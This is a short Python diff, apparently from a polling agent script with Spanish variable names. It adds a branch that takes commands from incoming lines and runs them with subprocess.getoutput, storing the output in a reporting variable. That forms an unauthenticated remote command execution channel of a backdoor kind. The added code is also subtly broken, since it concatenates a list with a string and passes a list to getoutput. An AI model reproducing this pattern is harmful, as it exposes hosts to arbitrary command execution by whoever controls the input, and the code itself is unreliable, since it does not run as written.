@@ -116,6 +116,16 @@ while True:
                     else:
                         consola += ip + ":no,"
                         print(ip + " sin respuesta\r")
+        if 'comando' in line:
+            comando = line.split(': ')
+            comandos = comando[1].split(',')
+            if consola != '':
+                consola = ''
+            if comandos != '':
+                print("Ejecutando " + comandos + "\r")
+                response = subprocess.getoutput(comandos)
+                print(response)
+                consola = response
         print(line , sep='',end ='\r')
     
     sleep(3)
